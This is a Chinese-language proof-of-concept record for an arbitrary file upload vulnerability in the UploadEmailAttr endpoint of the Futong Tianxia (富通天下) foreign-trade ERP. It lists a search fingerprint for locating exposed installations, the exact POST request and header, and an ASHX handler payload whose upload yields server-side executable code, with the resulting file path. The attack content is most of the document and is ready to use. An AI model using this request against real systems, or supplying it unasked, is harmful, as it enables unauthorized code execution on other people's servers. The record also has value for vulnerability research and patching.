# 富通天下外贸ERPUploadEmailAttr存在任意文件上传漏洞

- **系统**：富通天下外贸　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title="用户登录_富通天下外贸ERP"`
- **请求**：`POST /JoinfApp/EMail/UploadEmailAttr?name=.ashx HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
<% @ webhandler language="C#" class="AverageHandler" %>
using System;
using System.Web;
public class AverageHandler : IHttpHandler
public bool IsReusable
{ get { return true; } }
public void ProcessRequest(HttpContext ctx)
ctx.Response.Write("hello");

文件上传位置
/JoinfWebFile/temp/emailatta/202404/20240417D636C4D1F279410CB324E1AFFE28B141.ashx
```

**其他**
- 富通天下外贸ERP UploadEmailAttr存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 富通天下外贸ERP